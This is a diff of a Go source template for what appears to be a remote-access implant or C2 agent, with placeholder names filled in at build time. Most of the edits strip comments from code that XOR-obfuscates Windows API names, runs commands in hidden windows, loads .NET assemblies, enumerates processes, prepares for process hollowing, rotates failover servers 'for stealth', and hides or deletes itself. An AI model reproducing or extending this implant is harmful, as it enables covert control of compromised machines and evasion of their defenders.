@@ -26,7 +26,7 @@ import (
 	"github.com/Ne0nd0g/go-clr"
 )
 
-// Obfuscation function for runtime deobfuscation
+// Obfuscation func for runtime deobfuscation
 func deobfuscateString(obfuscated []byte, key byte) string {
 	result := make([]byte, len(obfuscated))
 	for i := 0; i < len(obfuscated); i++ {
@@ -47,25 +47,20 @@ const (
 	PAGE_EXECUTE_READWRITE = 0x40
 	PAGE_READWRITE = 0x04
 
-	// For kernel32.dll functions
 	PROCESS_ALL_ACCESS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME
 
-	// For process enumeration
 	TH32CS_SNAPPROCESS = 0x00000002
 	MAX_PATH = 260
 
-	// For process creation
 	CREATE_NEW_CONSOLE = 0x00000010
 	CREATE_NO_WINDOW = 0x08000000
 	STARTF_USESHOWWINDOW = 0x00000001
 	STARTF_USESTDHANDLES = 0x00000100
 	SW_HIDE = 0
 
-	// For pipe creation
 	FILE_ATTRIBUTE_NORMAL = 0x00000080
 	INVALID_HANDLE_VALUE = 0xFFFFFFFF
 
-	// For process hollowing
 	IMAGE_DOS_SIGNATURE = 0x5A4D
 	IMAGE_NT_SIGNATURE = 0x00004550
 	IMAGE_FILE_MACHINE_I386 = 0x014c
@@ -76,7 +71,6 @@ const (
 )
 
 var (
-	// Obfuscated DLL names and API functions
 	obfuscatedKernel32DLL = []byte{0x29, 0x27, 0x30, 0x2c, 0x27, 0x2e, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e} // "kernel32.dll"
 	obfuscatedNtdllDLL = []byte{0x2c, 0x36, 0x26, 0x2e, 0x2e, 0x6c, 0x26, 0x2e, 0x2e} // "ntdll.dll"
 	obfuscatedUser32DLL = []byte{0x37, 0x31, 0x27, 0x30, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e} // "user32.dll"
@@ -102,10 +96,8 @@ var (
 	obfuscatedCreatePipe = []byte{0x01, 0x30, 0x27, 0x23, 0x36, 0x27, 0x12, 0x2b, 0x32, 0x27} // "CreatePipe"
 	obfuscatedReadFile = []byte{0x10, 0x27, 0x23, 0x26, 0x04, 0x2b, 0x2e, 0x27} // "ReadFile"
 
-	// XOR key for deobfuscation
 	obfuscationKey = byte(0x42)
 
-	// DLL and procedure handles
 	kernel32 = syscall.NewLazyDLL(deobfuscateString(obfuscatedKernel32DLL, obfuscationKey))
 	ntdll = syscall.NewLazyDLL(deobfuscateString(obfuscatedNtdllDLL, obfuscationKey))
 	user32 = syscall.NewLazyDLL(deobfuscateString(obfuscatedUser32DLL, obfuscationKey))
@@ -132,7 +124,6 @@ var (
 	procReadFile = kernel32.NewProc(deobfuscateString(obfuscatedReadFile, obfuscationKey))
 )
 
-// PROCESSENTRY32 structure for process enumeration
 type PROCESSENTRY32 struct {
 	Size            uint32
 	Usage           uint32
@@ -312,8 +303,6 @@ type STARTUPINFO struct {
 
 type CONTEXT struct {
 	ContextFlags uint32
-	/* Additional fields depending on architecture */
-	/* For x64 */
 	Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15 uint64
 	Rip uint64
 	/* Control flags */
@@ -369,7 +358,6 @@ func createProcess(applicationName *uint16, commandLine *uint16, processAttribut
 	return nil
 }
 
-// executeCommandHidden executes a Windows command with the window hidden and captures output using pipes
 func executeCommandHidden(command string) (string, error) {
 	if runtime.GOOS != "windows" {
 		return "", fmt.Errorf("executeCommandHidden only supported on Windows")
@@ -451,19 +439,15 @@ func executeCommandHidden(command string) (string, error) {
 		return "", err
 	}
 
-	// Close the write handles in parent after process creation since child now has them
 	syscall.CloseHandle(syscall.Handle(stdoutWrite))
 	syscall.CloseHandle(syscall.Handle(stderrWrite))
 
-	// Close process and thread handles when done
 	defer syscall.CloseHandle(syscall.Handle(pi.Process))
 	defer syscall.CloseHandle(syscall.Handle(pi.Thread))
 
-	// Set up channels to read stdout and stderr concurrently to prevent pipe buffer overflow
 	stdoutChan := make(chan []byte)
 	stderrChan := make(chan []byte)
 
-	// Read stdout concurrently
 	go func() {
 		var stdoutBytes []byte
 		var buffer [4096]byte
@@ -506,7 +490,6 @@ func executeCommandHidden(command string) (string, error) {
 		stdoutChan <- stdoutBytes
 	}()
 
-	// Read stderr concurrently
 	go func() {
 		var stderrBytes []byte
 		var buffer [4096]byte
@@ -549,7 +532,6 @@ func executeCommandHidden(command string) (string, error) {
 		stderrChan <- stderrBytes
 	}()
 
-	// Wait for the process to complete with a timeout to prevent hanging
 	result, err := syscall.WaitForSingleObject(syscall.Handle(pi.Process), 60000) // 60 second timeout
 	if err != nil || result == syscall.WAIT_TIMEOUT {
 		// If timeout occurs, try to terminate the process gracefully
@@ -557,7 +539,6 @@ func executeCommandHidden(command string) (string, error) {
 		return fmt.Sprintf("[ERROR] Command execution timed out after 60 seconds"), nil
 	}
 
-	// Get the output from both channels
 	stdoutBytes := <-stdoutChan
 	stderrBytes := <-stderrChan
 
@@ -839,10 +820,8 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_DECRYPT_DATA_FUNC}(encryptedData string) (s
 		return encryptedData, nil
 	}
 
-	// First try URL encoding (most common for Fernet tokens)
 	decoded, err := base64.URLEncoding.DecodeString(encryptedData)
 	if err != nil {
-		// If URL encoding fails, try standard base64 encoding
 		decoded, err = base64.StdEncoding.DecodeString(encryptedData)
 		if err != nil {
 			return encryptedData, err
@@ -1065,7 +1044,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {
 
 
 
-	// Use the hidden command execution function for Windows to prevent any console window flickering
 	result, err := executeCommandHidden(command)
 	if err != nil {
 		return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
@@ -1339,8 +1317,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command string
 }
 
 func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_PROCESS_ID_FUNC}(processName string) (uint32, error) {
-	// Find process ID for the specified process name (Windows only)
-	// Convert process name to lowercase for comparison
 	processName = strings.ToLower(processName)
 
 	// Create a snapshot of all processes in the system
@@ -1655,7 +1631,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 			a.{AGENT_RESET_FAIL_COUNT_FUNC}()
 			break
 		} else {
-			// Don't print anything for stealth - increment fail count only if not in failover attempt
 			if !a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} {
 				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
 			}
@@ -1691,7 +1666,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
 					a.{AGENT_INTERACTIVE_MODE_FIELD} = false
 				}
 			} else {
-				// Failed to check interactive status, but don't print anything for stealth
 				_ = err // Use the error variable to avoid unused variable warning
 			}
 		}
@@ -1876,7 +1850,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WORKING_HOURS_FUNC}() bool {
 		// Later on, We might want to parse the timezone
 	}
 
-	// Check if current day is in the allowed working days
 	// Go's Weekday: 0=Sunday, 1=Monday, 2=Tuesday, etc.
 	currentWeekday := int(now.Weekday())
 	if currentWeekday == 0 {
@@ -2064,9 +2037,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_TRY_FAILOVER_FUNC}() bool {
 			a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = false  // Reset the flag
 			return true
 		} else {
-			// If registration failed, try the next failover URL
-			// Don't print anything for stealth
-			// Continue to the next URL
 		}
 	}
 
@@ -2081,8 +2051,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INCREMENT_FAIL_COUNT_FUNC}() {
 	a.{AGENT_CURRENT_FAIL_COUNT_FIELD}++
 	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
 
-	// If we've reached the maximum fail count, try failover, but only if not already in a failover attempt
-	// to prevent recursion
 	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} >= a.{AGENT_MAX_FAIL_COUNT_FIELD} && !a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} {
 		a.{AGENT_TRY_FAILOVER_FUNC}()
 	}
@@ -2130,8 +2098,6 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
 }
 
 func {AGENT_HIDE_CONSOLE_FUNC}() {
-	// Hide console window on Windows using direct Windows API calls for immediate effect
-	// Method 1: Use ShowWindow to hide the console window
 	consoleHandle, _, _ := procGetConsoleWindow.Call()
 	if consoleHandle != 0 {
 		procShowWindow.Call(
@@ -2140,12 +2106,10 @@ func {AGENT_HIDE_CONSOLE_FUNC}() {
 		)
 	}
 
-	// Method 2: Free the console to completely detach from the parent process
 	procFreeConsole.Call()
 }
 
 func main() {
-	// Hide console for Windows
 	{AGENT_HIDE_CONSOLE_FUNC}()
 
 	agentID := "{AGENT_ID}"
